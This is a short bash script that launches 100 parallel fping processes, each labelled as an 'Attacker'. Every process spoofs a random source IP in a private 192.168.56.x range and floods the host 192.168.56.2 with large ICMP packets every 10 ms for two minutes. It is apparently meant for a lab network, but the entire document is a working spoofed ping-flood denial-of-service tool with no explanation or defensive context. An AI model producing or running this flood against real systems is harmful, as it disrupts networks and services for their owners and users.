#!/bin/bash

# fping flags
# -S <source address>
# -l Loop forever
# -i interval between packets
# -t time to wait for a reply
# -b size of packets in bytes (IE, assume an MTU of 1500)
# -M don't fragment packets (larger packets get dropped)



#### Get a random source IP address
STARTIP=4
ENDIP=254
RUN_IP=$(( STARTIP + RANDOM % (ENDIP - STARTIP + 1) ))

MAX_PROCS=100
for (( i=0; i<$MAX_PROCS; i++ )); do
  STARTIP=4
  ENDIP=254
  RUN_IP=$(( STARTIP + RANDOM % (ENDIP - STARTIP + 1) ))
  echo "Starting Attacker $i"
    /usr/bin/timeout 2m /usr/bin/fping -l -b 1470 -p 10 -S 192.168.56.$RUN_IP -l -i 1 192.168.56.2 &
  sleep 1
done
